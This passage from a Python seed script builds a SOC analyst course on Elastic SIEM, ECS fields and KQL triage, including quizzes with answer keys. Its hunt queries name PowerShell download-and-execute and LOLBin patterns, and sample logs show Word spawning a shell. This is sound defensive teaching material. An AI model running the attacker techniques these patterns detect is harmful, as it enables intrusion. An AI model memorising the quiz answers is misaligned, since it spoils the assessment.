- **Shipper** — Agent forwarding events from sensor to SIEM
- **Wazuh manager** — Open-source HIDS that produces alert documents consumable by Elastic
- **Hybrid SIEM** — Architecture mixing on-prem ingest with cloud retention/search

## Further reading

- Elastic Common Schema reference: https://www.elastic.co/guide/en/ecs/current/index.html
- Elastic Beats overview: https://www.elastic.co/guide/en/beats/libbeat/current/beats-reference.html
- Wazuh integration with Elastic Stack: https://documentation.wazuh.com/current/installation-guide/wazuh-indexer/index.html
- BTL1 syllabus: SIEM Domain — Investigating with Splunk / ELK
- SANS GCIH KSA: Domain 1 — Log Analysis Fundamentals
""",
    )

    # Quiz on Lesson 1
    m2l1q = _add_lesson(
        session, mod2, order=2,
        title="Pipeline + architecture quiz",
        lesson_type=LessonType.QUIZ, duration_min=8,
        content_md=(
            "Five questions on the pipeline stages, SIEM-vs-aggregator differences, "
            "and ION's deployment architecture. Pass threshold matches the course "
            "default — re-read Lesson 1 if you fall short."
        ),
    )
    _add_q(session, m2l1q, order=1, kind=QuestionKind.SINGLE,
        stem_md="Which Elastic Stack component is responsible for the **normalise** stage of the SIEM pipeline?",
        options=[
            {"value": "kibana", "label": "Kibana"},
            {"value": "beats_modules", "label": "Beats modules / ingest pipelines"},
            {"value": "detection_engine", "label": "The detection engine"},
            {"value": "ilm", "label": "ILM (Index Lifecycle Management)"},
        ],
        correct="beats_modules",
        explanation_md="**Beats modules** (or Logstash filters / ingest pipelines) apply the ECS schema during ingest. Kibana queries the normalised data and ILM manages index rollover; neither performs normalisation itself.",
        points=2,
    )
    _add_q(session, m2l1q, order=2, kind=QuestionKind.MULTI,
        stem_md="Which capabilities differentiate a SIEM from a plain log aggregator? Pick all that apply.",
        options=[
            {"value": "schema", "label": "Schema normalisation"},
            {"value": "rules", "label": "Scheduled detection rules with suppression"},
            {"value": "compression", "label": "Compression of stored data"},
            {"value": "workflow", "label": "Alert lifecycle workflow"},
            {"value": "tiers", "label": "Hot/warm/cold retention tiers"},
        ],
        correct=["schema", "rules", "workflow", "tiers"],
        explanation_md="Compression is a property of any storage system. The other four capture the value SIEMs add over flat aggregators — schema enforcement, stateful detection, workflow, and tiered retention.",
        points=3,
    )
    _add_q(session, m2l1q, order=3, kind=QuestionKind.TRUEFALSE,
        stem_md="A failed alert can always be diagnosed by checking whether the underlying events arrived in the index.",
        options=[{"value": "true", "label": "True"}, {"value": "false", "label": "False"}],
        correct="false",
        explanation_md="**False.** Events may be present but with the wrong schema (parse/normalise failure), or the rule's filter context may exclude them, or the rule may have run during a query-stage outage. Index presence is necessary but not sufficient.",
        points=1,
    )
    _add_q(session, m2l1q, order=4, kind=QuestionKind.SINGLE,
        stem_md="ION ingests its cases from which Elasticsearch index family by default?",
        options=[
            {"value": "winlogbeat", "label": "winlogbeat-*"},
            {"value": "filebeat", "label": "filebeat-*"},
            {"value": "alerts", "label": ".alerts-security.alerts-default"},
            {"value": "metrics", "label": "metrics-*"},
        ],
        correct="alerts",
        explanation_md="Detection rules write to the alerts data stream; ION pulls cases from there, not from the raw Beats indices.",
        points=2,
    )
    _add_q(session, m2l1q, order=5, kind=QuestionKind.SHORTANSWER,
        stem_md="Name two architectural advantages of an on-prem SIEM relative to a cloud-native one.",
        options=None,
        correct=["data residency, no egress costs", "no egress, on-prem identity", "data residency, identity integration", "control over retention, no egress"],
        explanation_md="Acceptable answers: data residency / no egress costs, tighter integration with on-prem identity providers (AD, Keycloak), full control over retention. Any two are correct.",
        points=2,
    )

    # Lesson 2 — ECS data model
    m2l2 = _add_lesson(
        session, mod2, order=3,
        title="Speaking ECS — the data model L1 lives in",
        lesson_type=LessonType.READING, duration_min=22,
        content_md="""
> **Learning objectives.** By the end of this lesson you'll be able to:
> 1. Recall the ten core ECS fields used in 90% of L1 triage queries and identify their data type
> 2. Map a Windows Security event, a Linux auditd record, and a Sysmon process-creation event to their ECS representations
> 3. Recognise common ECS pitfalls (case sensitivity, multi-value fields, `event.action` vs `event.code`)
> 4. Translate between Wazuh `rule.*` fields and ECS `event.*` fields
> 5. Validate an unfamiliar field by checking the ECS reference rather than guessing

## The ten fields you'll type every shift

ECS defines hundreds of fields, but L1 triage hinges on a small set. Memorise these:

| Field | Type | Meaning | Example |
| --- | --- | --- | --- |
| `@timestamp` | date | UTC timestamp of the event itself, not of ingest | `2026-04-23T08:14:22.331Z` |
| `host.name` | keyword | Hostname per the host's own metadata | `WS-FIN-014` |
| `user.name` | keyword | Acting user (logged-on, executing, authenticating) | `j.smith` |
| `source.ip` | ip | Source IP of an event with directionality | `10.42.7.91` |
| `destination.ip` | ip | Destination IP | `185.220.101.7` |
| `process.name` | keyword | Executable name without path | `powershell.exe` |
| `process.command_line` | keyword | Full command line as launched | `powershell.exe -enc JABh...` |
| `process.parent.name` | keyword | Parent process name | `winword.exe` |
| `event.action` | keyword | Source-agnostic action verb | `logon-failed`, `process-started` |
| `event.code` | keyword | Source-specific code | `4625`, `1` (Sysmon) |
| `event.category` | keyword (array) | High-level category | `["authentication"]`, `["process"]` |
| `network.transport` | keyword | TCP / UDP / ICMP | `tcp` |
| `file.path` | keyword | Full path of touched file | `C:\\\\Users\\\\j.smith\\\\AppData\\\\Local\\\\Temp\\\\inv.docm` |
| `file.hash.sha256` | keyword | SHA-256 of file content | `9f86d081...` |

### Three rules that bite L1 analysts repeatedly

1. **Field names are case-sensitive in KQL.** `User.Name` will silently match nothing.
2. **`event.category` is an array.** Use `event.category : "process"` (KQL handles array-contains automatically) but be aware aggregations may double-count.
3. **`event.action` versus `event.code`.** `event.action` is normalised across sources (a Windows logon-failed and a Linux ssh-failed both use `logon-failed`). `event.code` is source-specific (Windows EventID, Sysmon EventID, Wazuh rule ID). Default to `event.action` for cross-source hunts, `event.code` when you specifically need the Windows event ID.

## Worked example — same event, three sources

A user `m.alvarez` authenticates. Three telemetry sources record it; ECS makes the triple queryable in one shot:

- **Windows EventID 4624 (winlogbeat):** `event.category: ["authentication"]`, `event.action: "logged-in"`, `event.outcome: "success"`, `event.code: "4624"`, `user.name: "m.alvarez"`, `host.name: "WS-FIN-021"`.
- **Linux SSH (filebeat system module):** `event.category: ["authentication"]`, `event.action: "ssh_login"`, `event.outcome: "success"`, `user.name: "m.alvarez"`, `host.name: "lnx-jump-02"`, `source.ip: "10.42.4.18"`.
- **AWS CloudTrail ConsoleLogin (filebeat aws module):** `event.category: ["authentication"]`, `event.action: "ConsoleLogin"`, `event.outcome: "success"`, `user.name: "m.alvarez"`, `cloud.provider: "aws"`, `aws.cloudtrail.event_name: "ConsoleLogin"`.

A single KQL query `user.name : "m.alvarez" and event.category : "authentication" and @timestamp >= "now-24h"` returns all three. **That's the payoff of ECS** — and the reason ION's alert prompts and pgvector embeddings can stay source-agnostic.

```mermaid
flowchart TB
    subgraph Sources
        W[Windows<br/>Security 4624/4625]
        S[Sysmon<br/>EID 1/3/11]
        A[auditd<br/>execve / open]
        P[Packetbeat<br/>DNS / HTTP]
        WZ[Wazuh<br/>rule.id]
    end
    subgraph ECS
        E1[event.action]
        E2[event.category]
        E3[user.name]
        E4[host.name]
        E5[source.ip /<br/>destination.ip]
        E6[process.*]
        E7[file.*]
    end
    W --> E1 & E2 & E3 & E4 & E5
    S --> E1 & E2 & E4 & E6
    A --> E1 & E2 & E3 & E4 & E6 & E7
    P --> E5 & E2
    WZ --> E1 & E2
```

## Worked example — a Sysmon EventID 1 to ECS to KQL

Sysmon raw fields (what the endpoint emits):

```
ProcessId=8312
Image=C:\\Windows\\System32\\cmd.exe
CommandLine="cmd.exe" /c whoami
ParentImage=C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE
ParentCommandLine="WINWORD.EXE" /n "C:\\Users\\j.smith\\Downloads\\invoice.docm"
User=CORP\\j.smith
```

After ECS normalisation by the winlogbeat sysmon module:

```
event.code: "1"
event.action: "process-started"
event.category: ["process"]
process.name: "cmd.exe"
process.executable: "C:\\Windows\\System32\\cmd.exe"
process.command_line: "\\"cmd.exe\\" /c whoami"
process.parent.name: "WINWORD.EXE"
process.parent.command_line: "\\"WINWORD.EXE\\" /n \\"C:\\Users\\j.smith\\Downloads\\invoice.docm\\""
user.name: "j.smith"
user.domain: "CORP"
```

The ECS form is queryable by:

```kql
process.parent.name : "WINWORD.EXE" and process.name : ("cmd.exe" or "powershell.exe")
```

A classic Office-spawning-shell hunt mapped to MITRE ATT&CK **T1566.001** (Spearphishing Attachment) followed by **T1059** (Command and Scripting Interpreter).

## How sensors map to ECS

The mapping between sensor and ECS is the responsibility of the Beat/Agent module or the ingest pipeline. Knowing roughly how each common L1 source maps will save you hours when a field "doesn't seem to be populated":

- **Winlogbeat (Security, System, Application channels)** — XML EventData fields end up under `winlog.event_data.*` raw, with the most useful ones promoted to ECS via the Windows module. EventID 4624's `TargetUserName` becomes `user.name`; `IpAddress` becomes `source.ip`; the channel becomes `winlog.channel`.
- **Sysmon via Winlogbeat-sysmon module** — Sysmon EventID 1 (process create) maps to `event.action: "process-started"`, `process.executable`, `process.command_line`, `process.parent.executable`, `process.hash.sha256`. EventID 3 (network connect) populates `source.ip`, `destination.ip`, `network.transport`.
- **Auditbeat (auditd module on Linux)** — `event.action: "executed"` for execve, with `process.executable`, `process.args`, `user.name`, `user.effective.name`. File integrity events use `event.action: "modified"` / `"created"` / `"deleted"` and populate `file.path`, `file.hash.sha256`.
- **Packetbeat** — Protocol-aware passive sniffing. DNS queries map to `dns.question.name`, `dns.resolved_ip`. HTTP requests map to `http.request.method`, `url.full`, `user_agent.original`.
- **Wazuh agent / Wazuh-Elastic integration** — Wazuh produces its own JSON with `rule.id`, `rule.description`, `rule.level`, `rule.mitre.id` (an array of ATT&CK technique IDs), and `decoder.name`. ION's alert-prompt matcher uses both `rule.id` (5-tier matcher tier 1) and `rule.mitre.technique` (tier 3).

## Common pitfalls and gotchas

- **Field-not-populated versus field-not-present.** `not user.name : *` matches docs where the field is absent. `user.name : ""` matches docs where it's the empty string. Distinct cases, distinct meanings.
- **Time skew.** `@timestamp` is event time; `event.ingested` is ingest time. If a host's clock drifts, queries on `@timestamp` will mis-align with reality. Spot this by comparing the two fields.
- **Multi-value categories.** A document may have `event.category: ["network", "session"]`. A query `event.category : "network"` matches; a visualisation grouping by category may double-count.
- **Truncation.** Long `process.command_line` values can exceed `keyword`'s default `ignore_above` (1024 chars). The `.text` subfield (analysed) is searchable but the `keyword` is not — leading to confusing *"the command line is there but my term query doesn't hit"* results.
- **ECS version drift.** ECS evolves. ION's stack pins a version; new fields in ECS 8.x may not be present in older indices. Check Discover's field list before assuming a field is absent from the data model.

## Glossary

- **ECS field** — A canonical key under a defined namespace (e.g. `process.command_line`)
- **Keyword field** — Exact-match string field in Elasticsearch (case-sensitive)
- **Text field** — Analysed (tokenised) string field; supports full-text search
- **`@timestamp`** — Event-time, UTC, the primary time axis
- **`event.ingested`** — Time the document landed in the SIEM (post-pipeline)
- **`event.action`** — Source-agnostic action verb
- **`event.code`** — Source-specific event identifier
- **Multi-value field** — ECS field that legitimately holds an array
- **Promotion** — Beats-pipeline step that copies a raw field into its ECS counterpart
- **`winlog.event_data.*`** — Raw Windows EventData container (pre-promotion)
- **CIM mapping** — Splunk's Common Information Model equivalent (e.g. `src_ip` for `source.ip`)

## Further reading

- ECS field reference: https://www.elastic.co/guide/en/ecs/current/ecs-field-reference.html
- ECS event categorisation: https://www.elastic.co/guide/en/ecs/current/ecs-category-field-values-reference.html
- Winlogbeat Windows module: https://www.elastic.co/guide/en/beats/winlogbeat/current/winlogbeat-module-security.html
- Wazuh ruleset: https://documentation.wazuh.com/current/user-manual/ruleset/index.html
- MITRE ATT&CK technique references: T1059 (Command and Scripting Interpreter), T1566.001 (Spearphishing Attachment)
""",
    )

    # Quiz on Lesson 2
    m2l2q = _add_lesson(
        session, mod2, order=4,
        title="ECS field knowledge — quiz",
        lesson_type=LessonType.QUIZ, duration_min=8,
        content_md="Six questions on the core ECS fields, source mappings, and pitfalls.",
    )
    _add_q(session, m2l2q, order=1, kind=QuestionKind.SINGLE,
        stem_md="Which ECS field stores the **full executed command line** of a process?",
        options=[
            {"value": "name", "label": "process.name"},
            {"value": "executable", "label": "process.executable"},
            {"value": "command_line", "label": "process.command_line"},
            {"value": "args", "label": "process.args"},
        ],
        correct="command_line",
        explanation_md="`process.name` is the bare executable name, `process.executable` is the full path, `process.args` is the parsed argument array. `process.command_line` is the unparsed full string.",
        points=2,
    )
    _add_q(session, m2l2q, order=2, kind=QuestionKind.MULTI,
        stem_md="Which fields would you add to a hunt query for *Office spawning a shell*? Pick all that apply.",
        options=[
            {"value": "parent_name", "label": "process.parent.name"},
            {"value": "name", "label": "process.name"},
            {"value": "os_family", "label": "host.os.family"},
            {"value": "category", "label": "event.category : \"process\""},
            {"value": "outcome", "label": "event.outcome"},
        ],
        correct=["parent_name", "name", "category"],
        explanation_md="`host.os.family` is rarely needed because Office is Windows-bound and the parent name already signals that. `event.outcome` doesn't apply meaningfully to process-creation events.",
        points=3,
    )
    _add_q(session, m2l2q, order=3, kind=QuestionKind.TRUEFALSE,
        stem_md="`event.action` and `event.code` always have the same value for a Windows logon event.",
        options=[{"value": "true", "label": "True"}, {"value": "false", "label": "False"}],
        correct="false",
        explanation_md="**False.** `event.action` is normalised (`logged-in`, `logon-failed`); `event.code` is the Windows EventID (`4624`, `4625`). They're intentionally distinct.",
        points=1,
    )
    _add_q(session, m2l2q, order=4, kind=QuestionKind.SHORTANSWER,
        stem_md="Why might a query `user.name : \"alice\"` return zero hits even when Discover shows authentication events for Alice?",
        options=None,
        correct=["case sensitivity", "case", "domain prefix", "normalisation gap", "the value is uppercase Alice"],
        explanation_md="Acceptable: case sensitivity (`Alice` vs `alice`), domain prefix (`CORP\\Alice` stored verbatim), or normalisation gap where the source populates `winlog.event_data.TargetUserName` but the ingest pipeline didn't promote it to `user.name`. Any one is correct.",
        points=2,
    )
    _add_q(session, m2l2q, order=5, kind=QuestionKind.SINGLE,
        stem_md="A Wazuh alert document's `rule.mitre.technique` field contains `[\"T1059.001\", \"T1566.001\"]`. What does this tell an L1 analyst?",
        options=[
            {"value": "invalid", "label": "The alert is invalid because techniques are mutually exclusive"},
            {"value": "multi", "label": "The Wazuh rule is mapped to multiple ATT&CK techniques and either may apply"},
            {"value": "twice", "label": "The alert fired twice"},
            {"value": "first", "label": "Only the first technique is authoritative"},
        ],
        correct="multi",
        explanation_md="ATT&CK technique mappings can be plural — a single rule may legitimately cover multiple techniques (here, PowerShell + Spearphishing Attachment). Both are candidate context.",
        points=2,
    )
    _add_q(session, m2l2q, order=6, kind=QuestionKind.SHORTANSWER,
        stem_md="Name two ECS fields that always appear on a Sysmon EventID 3 (network connect) document.",
        options=None,
        correct=["source.ip, destination.ip", "destination.ip, network.transport", "source.ip, network.transport", "host.name, source.ip", "source.ip and destination.ip"],
        explanation_md="Acceptable: `source.ip` / `destination.ip` (and/or `source.port` / `destination.port`), `network.transport`, `process.name`, `host.name`. Any two of these.",
        points=2,
    )

    # Lesson 3 — KQL
    m2l3 = _add_lesson(
        session, mod2, order=5,
        title="Querying the SIEM with KQL",
        lesson_type=LessonType.READING, duration_min=24,
        content_md="""
> **Learning objectives.** By the end of this lesson you'll be able to:
> 1. Write KQL boolean expressions using `and`, `or`, `not`, parentheses, and field-existence checks
> 2. Use wildcards, ranges, and lists in KQL queries while avoiding common performance pitfalls
> 3. Compose triage queries against `winlogbeat-*`, `filebeat-*`, and `logs-*` index patterns
> 4. Read SPL well enough to translate a basic Splunk detection into KQL
> 5. Recognise four hunt patterns: failed-auth-by-user, suspicious-child-of-svchost, beaconing detection, newly-registered-domain DNS

## KQL syntax in the depth an L1 actually needs

KQL (Kibana Query Language) is the default in Discover and detection rules. Syntax in the order you'll use it:

- **Term match:** `field : "value"`. Quotes are required if the value contains spaces or special characters.
- **Boolean:** `and`, `or`, `not`, lowercase. Group with parentheses: `(a or b) and not c`.
- **Wildcards:** `*` matches zero or more characters in a `keyword` field. `process.name : "power*"` works; leading wildcards (`*shell.exe`) are valid but slow — avoid in scheduled rules.
- **Lists:** `field : (val1 or val2 or val3)`. Equivalent to multiple ORs but easier to read.
- **Ranges:** `field >= value`, `field <= value`. For dates use Kibana time tokens: `@timestamp >= "now-1h"`.
- **Existence:** `field : *` matches any document with the field populated. `not field : *` matches absence.
- **Nested fields:** ECS dot notation works directly: `process.parent.name : "winword.exe"`.
- **Escaping:** Backslashes need doubling: `process.executable : "C:\\\\Windows\\\\System32\\\\cmd.exe"`. Colons inside quoted values are fine.

What KQL **does not** give you: aggregation, joins, regex (in Discover proper — Lens has different syntax), temporal correlation. For aggregations you use Lens or the search API; for cross-event correlation in Elastic you use EQL or detection-rule logic. As an L1, you stay in the boolean-filter regime; aggregations come from Lens visualisations or saved searches built by detection engineers.

## Worked example — building a query iteratively

**Goal:** find PowerShell launches by `j.smith` on `WS-FIN-014` in the last 6 hours, where the command line shows base64-encoded payloads.

```mermaid
flowchart LR
    A[Goal stated<br/>in English] --> B{Identify<br/>core ECS fields}
    B --> C[Term filters<br/>field : value]
    C --> D{Too broad?}
    D -- yes --> E[Add user,<br/>host, time]
    E --> D
    D -- no --> F{Too narrow?}
    F -- yes --> G[Loosen one<br/>condition]
    G --> D
    F -- no --> H[Save / hand to<br/>detection engineer]
```

- **Start:** `process.name : "powershell.exe"` — too broad.
- **Add user:** `process.name : "powershell.exe" and user.name : "j.smith"` — still broad if Smith uses PS legitimately.
- **Add host:** `... and host.name : "WS-FIN-014"`.
- **Add command-line condition:** `... and process.command_line : *-enc*` — common encoded-command flag.
- **Add time:** `... and @timestamp >= "now-6h"`.
- **Final:** `process.name : "powershell.exe" and user.name : "j.smith" and host.name : "WS-FIN-014" and process.command_line : *-enc* and @timestamp >= "now-6h"`.

If this returns 200 hits, the leading wildcard combined with broad command-line text is the bottleneck — replace with `process.command_line : ("*-enc *" or "*-encodedcommand*" or "*-e *")` to anchor the flag.

## Four hunt patterns L1 must read fluently

These four patterns cover most L1 triage queries. **Memorise the shape, not the verbatim string.**

### Pattern A — Failed logons by user, with a threshold

```kql
event.category : "authentication"
  and event.outcome : "failure"
  and user.name : "j.smith"
  and @timestamp >= "now-24h"
```

**Triage:** count by `source.ip` in Lens. > 5 distinct sources is suspicious. Cross-reference with successful logon (`event.outcome : "success"`) immediately following.

### Pattern B — Suspicious child of `svchost.exe`

```kql
process.parent.name : "svchost.exe"
  and not process.name : (
    "wuauclt.exe" or "WmiPrvSE.exe" or "TiWorker.exe" or
    "TrustedInstaller.exe" or "MoUsoCoreWorker.exe" or "sihost.exe"
  )
  and host.os.family : "windows"
```

**Triage:** `svchost.exe` legitimately spawns a known set of children. Anything outside the allow-list (e.g. `cmd.exe`, `powershell.exe`, unknown EXEs) is suspicious. Maps to ATT&CK **T1055** (Process Injection) and **T1543.003** (Windows Service).

### Pattern C — Beaconing detection (read-only at L1; detection engineers tune)

```kql
event.category : "network"
  and source.ip : "10.42.7.91"
  and destination.ip : *
  and not destination.ip : (10.0.0.0/8 or 172.16.0.0/12 or 192.168.0.0/16)
  and @timestamp >= "now-6h"
```

L1 won't compute interval consistency in KQL — that needs Lens or a detection rule. **The L1's job is to read the resulting alert:** "host X made N outbound connections to destination Y at consistent ~60s intervals over 6h". Maps to ATT&CK **T1071** (Application Layer Protocol).

### Pattern D — DNS to newly-registered or low-reputation domains

```kql
event.category : "network"
  and event.dataset : "*dns*"
  and dns.question.name : *
  and source.ip : 10.42.0.0/16
  and @timestamp >= "now-1h"
```

Then enrich with TIDE / OpenCTI in ION. The L1 doesn't compute "newly registered" — TIDE provides the verdict. The query gets the candidate set; the enrichment provides the score. Maps to ATT&CK **T1071.004** (DNS).

## Worked example — reading a real triage query

A detection engineer hands the L1 the following saved search to use during triage:

```kql
(event.code : "4688" or event.code : "1")
  and process.parent.name : "WINWORD.EXE"
  and not process.name : ("WerFault.exe" or "splwow64.exe")
```

**Line-by-line:**

- `(event.code : "4688" or event.code : "1")` — Windows Process Creation (4688) or Sysmon Process Create (1). Some hosts have one, some both, some neither — this hedges.
- `process.parent.name : "WINWORD.EXE"` — Word is the parent. Note no path or domain — this matches both legitimate and renamed-Word cases (a renamed process keeping the same `process.name` is itself suspicious; `process.executable` would tell that story).
- `not process.name : ("WerFault.exe" or "splwow64.exe")` — Word legitimately spawns these (crash reporter, print spooler bridge); excluding them removes noise.

The L1 reads this and understands: *"show me everything Word starts, except the two known-benign helpers"*. They do **not** modify the query without escalating to detection engineering, because the exclusion list is curated.

## SPL contrast and translation

ION uses KQL, but L1 analysts move between employers and you'll encounter Splunk. The translation is mostly mechanical:

- KQL `field : "value"` → SPL `field="value"`
- KQL `and` / `or` / `not` → SPL `AND` / `OR` / `NOT` (case-sensitive in SPL)
- KQL `field : *` → SPL `field=*`
- KQL aggregation? Done in Lens. SPL does it inline: `| stats count by user, src_ip`
- KQL time range? Time picker. SPL: `earliest=-1h latest=now`

Direct translation example:

```kql
event.code : "4625" and source.ip : 10.42.0.0/16 and @timestamp >= "now-1h"
```

```spl
index=wineventlog EventCode=4625 src_ip=10.42.0.0/16 earliest=-1h
| stats count by src_ip, user
```

Note SPL uses CIM (`src_ip`, `user`), not ECS (`source.ip`, `user.name`). **Memorise the half-dozen common mappings:** `src_ip` ↔ `source.ip`, `dest_ip` ↔ `destination.ip`, `user` ↔ `user.name`, `host` ↔ `host.name`, `process` ↔ `process.name`, `command_line` ↔ `process.command_line`.

## High-signal queries to keep in your head

```kql
process.parent.name : "svchost.exe"
  and process.name : ("cmd.exe" or "powershell.exe" or "rundll32.exe" or "regsvr32.exe")
  and @timestamp >= "now-24h"
```

High-signal hunt for living-off-the-land binaries spawned by `svchost.exe`. Maps to **T1218** (System Binary Proxy Execution).

```kql
event.code : "1102"
```

Windows Security log cleared. Single-event hunt — rare and high-signal. Maps to **T1070.001** (Indicator Removal: Clear Windows Event Logs).

```kql
process.command_line : (*Invoke-Expression* or *IEX*(* or *DownloadString* or *FromBase64String*)
```

PowerShell encoded-execution patterns. Maps to **T1059.001**. Note: not for production detection (too noisy without further qualifiers); fine for hunt.

## Glossary

- **KQL** — Kibana Query Language; boolean filter language used in Discover and detection rules
- **EQL** — Event Query Language; Elastic's correlation language (sequence, with-windows, joins)
- **SPL** — Splunk's Search Processing Language; pipeline-based search and analytics
- **Wildcard** — `*` in a query value, matching zero or more characters
- **Leading wildcard** — Wildcard at the start of a value (`*ell.exe`); generally slow
- **CIDR notation** — `10.42.7.0/24` form for IP ranges; KQL accepts directly on `ip` fields
- **Existence check** — `field : *` (present) or `not field : *` (absent)
- **Lens** — Kibana's drag-and-drop aggregation/visualisation tool
- **Detection rule** — Scheduled query that emits an alert; authored in KQL, EQL, or threshold form
- **Time picker** — Kibana's time-range selector that sets the implicit `@timestamp` filter
- **LOLBin** — Living-Off-the-Land Binary; a signed system binary abused by attackers (e.g. `regsvr32.exe`, `rundll32.exe`)

## Further reading

- KQL syntax reference: https://www.elastic.co/guide/en/kibana/current/kuery-query.html
- Elastic detection rules: https://github.com/elastic/detection-rules
- EQL syntax: https://www.elastic.co/guide/en/elasticsearch/reference/current/eql-syntax.html
- LOLBAS project: https://lolbas-project.github.io/
- MITRE ATT&CK: T1059, T1071, T1218, T1055, T1543.003, T1070.001
""",
    )

    # Quiz on Lesson 3
    m2l3q = _add_lesson(
        session, mod2, order=6,
        title="KQL fluency — quiz",
        lesson_type=LessonType.QUIZ, duration_min=8,
        content_md="Six questions on KQL syntax, performance, and SPL translation.",
    )
    _add_q(session, m2l3q, order=1, kind=QuestionKind.SINGLE,
        stem_md="Which KQL expression matches documents where `user.name` is populated **and** not equal to `SYSTEM`?",
        options=[
            {"value": "exists_and_not", "label": "user.name : * and not user.name : \"SYSTEM\""},
            {"value": "neq", "label": "user.name != \"SYSTEM\""},
            {"value": "not_only", "label": "not user.name : \"SYSTEM\""},
            {"value": "wild", "label": "user.name : *SYSTEM*"},
        ],
        correct="exists_and_not",
        explanation_md="`not user.name : \"SYSTEM\"` alone matches absence as well as non-SYSTEM. KQL has no `!=` operator. The combined existence + negation form is required.",
        points=2,
    )
    _add_q(session, m2l3q, order=2, kind=QuestionKind.MULTI,
        stem_md="Which KQL queries are likely to perform poorly in scheduled detection rules? Pick all that apply.",
        options=[
            {"value": "leading_wild_cmd", "label": "process.command_line : *encoded*"},
            {"value": "exact_proc", "label": "process.name : \"powershell.exe\""},
            {"value": "exact_code", "label": "event.code : \"4625\""},
            {"value": "leading_wild_user", "label": "user.name : *admin*"},
        ],
        correct=["leading_wild_cmd", "leading_wild_user"],
        explanation_md="Leading wildcards on `keyword` fields are expensive. Exact-match term queries are fast.",
        points=2,
    )
    _add_q(session, m2l3q, order=3, kind=QuestionKind.TRUEFALSE,
        stem_md="KQL supports temporal correlation — for example, *find a 4625 within 60 seconds of a 4624 from the same source.ip*.",
        options=[{"value": "true", "label": "True"}, {"value": "false", "label": "False"}],
        correct="false",
        explanation_md="**False.** That's EQL territory. KQL is purely a boolean filter language.",
        points=1,
    )
    _add_q(session, m2l3q, order=4, kind=QuestionKind.SHORTANSWER,
        stem_md="A detection engineer hands you `process.parent.name : \"WINWORD.EXE\" and process.name : (\"cmd.exe\" or \"powershell.exe\")`. State two ATT&CK technique IDs this query is most likely related to.",
        options=None,
        correct=["T1566.001 and T1059", "T1566.001, T1059", "T1059 and T1566.001", "T1566 and T1059", "T1059.001 and T1566.001"],
        explanation_md="**T1566.001** (Spearphishing Attachment, the delivery vector for malicious Office docs) and **T1059** (Command and Scripting Interpreter, with sub-technique T1059.001 for PowerShell or T1059.003 for cmd.exe). Either pair is acceptable.",
        points=2,
    )
    _add_q(session, m2l3q, order=5, kind=QuestionKind.SINGLE,
        stem_md="Translate `event.code : \"4625\" and source.ip : 10.42.7.0/24` into Splunk SPL using CIM field names.",
        options=[
            {"value": "ecs_in_spl", "label": "EventCode=4625 source.ip=10.42.7.0/24"},
            {"value": "cim_correct", "label": "EventCode=4625 src_ip=10.42.7.0/24"},
            {"value": "kql_punctuation", "label": "event.code=\"4625\" src_ip=\"10.42.7.0/24\""},
            {"value": "wrong_index", "label": "index=4625 src=10.42.7.0/24"},
        ],
        correct="cim_correct",
        explanation_md="Splunk's CIM uses `src_ip`, and field names use `=` rather than `:`.",
        points=2,
    )
    _add_q(session, m2l3q, order=6, kind=QuestionKind.SHORTANSWER,
        stem_md="Why do L1 analysts not author beaconing-detection queries themselves?",
        options=None,
        correct=["temporal aggregation", "interval consistency", "outside KQL filter scope", "needs detection rule", "needs Lens", "kql can't aggregate"],
        explanation_md="Beaconing requires temporal aggregation (interval-consistency analysis), which is outside KQL's filter scope and lives in scheduled detection rules or Lens visualisations curated by detection engineering. L1 consumes the resulting alert, not the math.",
        points=2,
    )

    # Lesson 4 — Pivots, timelines, lifecycle
    m2l4 = _add_lesson(
        session, mod2, order=7,
        title="Pivots, timelines, and the alert lifecycle",
        lesson_type=LessonType.READING, duration_min=22,
        content_md="""
> **Learning objectives.** By the end of this lesson you'll be able to:
> 1. Construct a 5-to-10-step pivot chain from a single alert into an incident timeline using the host → user → process → network cluster pattern
> 2. Decide when a saved search or dashboard answers the question and when it misleads
> 3. Manage the in-SIEM alert state machine and synchronise it with the ION case workflow
> 4. Hand off a triaged case to L2 with a coherent timeline, indicators, and the pivots already attempted
> 5. Recognise three common dashboard pitfalls (time-range mismatch, filter inheritance, index-pattern drift)

## The cluster investigation pattern

A single alert is rarely the full story. The cluster investigation pattern (popularised by Splunk's SURGe team and Hunters' "cluster" formalism, codified in MITRE's PRE-ATT&CK and operator runbooks) gives an L1 a repeatable expansion sequence.

```mermaid
flowchart TD
    A[Alert: anchor IOC] --> B[Host context]
    B --> C[User context]
    C --> D[Process context]
    D --> E[Process parent]
    D --> F[Process children]
    D --> G[Network destinations]
    D --> H[File writes]
    H --> I[File hash]
    I --> J[Hash across fleet]
    G --> K[DNS queries]
    C --> L[Auth on other hosts<br/>lateral movement]
    A --> M[Auth failures<br/>prior 24h]
```

Translated to ECS pivots, an L1's standard expansion from a single suspicious destination IP `185.220.101.7`:

1. **Anchor:** `destination.ip : "185.220.101.7"` over the last 7 days. Get all hosts that talked to it.
2. **Host expansion:** From the result, take `host.name` values. For each host, get all `user.name` values active during the contact window.
3. **User expansion:** For each user, get all `process.name` values around contact time on that host.
4. **Process expansion:** For each suspicious process, get its parent (`process.parent.name`) and children (query for `process.parent.name : "<that process>"` on the same host).
5. **Network expansion:** For each suspicious process, get all `destination.ip` from its network events.
6. **Lateral expansion:** Take the set of suspicious users and check authentication events on *other* hosts.
7. **File expansion:** For each suspicious process, query `event.category : "file" and host.name : "<host>"` around the time window — what files did it write or read?
8. **Hash expansion:** Pull `process.hash.sha256` (or `file.hash.sha256`) and check for the same hash on other hosts in the fleet.
9. **DNS expansion:** Check `dns.question.name` from the suspicious host around the contact window.
10. **Authentication failure expansion:** Check for failed logons involving the implicated users in the prior 24 hours — was credential brute-force the entry vector?

By step 10, an L1 has a coherent **five-axis story** (host, user, process, network, file) without leaving Discover. The expansion is mechanical; the analyst's job is to *narrate* the result.

## Worked example — full pivot from an outbound-IP alert

ION case `CRIT-2026-04-118`: *"Outbound connection to known-bad IP 185.220.101.7"*. Anchor: `destination.ip : "185.220.101.7"`.

```mermaid
sequenceDiagram
    participant L1 as L1 Analyst
    participant K as Kibana Discover
    participant ION as ION

    Note over L1,K: Step 1 — anchor query
    L1->>K: destination.ip : "185.220.101.7"
    K-->>L1: WS-MKT-009, 2 events, rundll32.exe, TCP/443 @ 11:47:14Z

    Note over L1,K: Step 2 — host context (auth)
    L1->>K: host.name:"WS-MKT-009" and event.category:"authentication"<br/>and event.outcome:"success" and time near 11:47
    K-->>L1: k.patel logged in at 11:32:08Z

